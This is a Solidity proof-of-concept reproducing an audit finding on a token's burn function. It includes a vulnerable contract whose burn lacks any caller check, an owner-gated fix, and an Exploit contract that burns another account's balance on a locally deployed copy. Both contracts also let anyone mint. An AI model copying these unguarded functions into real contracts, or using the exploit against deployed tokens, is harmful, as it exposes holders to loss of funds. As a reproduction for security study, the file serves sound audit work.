// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  SuperHedge SHToken.burn (Halborn).
    burn(account, amount) has no caller check. Alice holds 10.
    Bob burns those 10. The control only lets the token owner burn,
    so Alice still holds 10.
*/

contract SHToken {
    mapping(address => uint256) internal _balance;

    function balanceOf(address account) public view returns (uint256) {
        return _balance[account];
    }
    address public owner;
    uint256 public burned;
    address public lastFrom;
    uint256 public lastAmount;
    address public lastCaller;

    constructor() {
        owner = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        _balance[to] += amount;
    }

    function burn(address account, uint256 amount) external {
        lastCaller = msg.sender;
        require(amount > 0, "Amount must be greater than zero");
        require(balanceOf(account) >= amount, "Insufficient balance");
        _balance[account] -= amount;
        lastFrom = account;
        lastAmount = amount;
        burned += amount; // @> VULN: any caller can burn another account's balance
    }
}

contract SHTokenFixed {
    mapping(address => uint256) internal _balance;
    address public owner;

    function balanceOf(address account) public view returns (uint256) {
        return _balance[account];
    }

    constructor() {
        owner = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        _balance[to] += amount;
    }

    function burn(address account, uint256 amount) external {
        require(msg.sender == owner, "owner");
        require(amount > 0, "Amount must be greater than zero");
        require(balanceOf(account) >= amount, "Insufficient balance");
        _balance[account] -= amount;
    }
}

contract BurnMarker {
    string public symbol = "BURNED";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

contract Exploit {
    address public constant ALICE = 0x2222222222222222222222222222222222222222;
    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    SHToken public token;
    BurnMarker public marker;

    function run() external {
        token = new SHToken();
        marker = new BurnMarker();
        token.mint(ALICE, 10 ether);
        token.burn(ALICE, 10 ether);
        require(token.balanceOf(ALICE) == 0, "alice burned");
        marker.mint(SINK, 10 ether);
        require(marker.balanceOf(SINK) == 10 ether, "10 burned");
    }
}
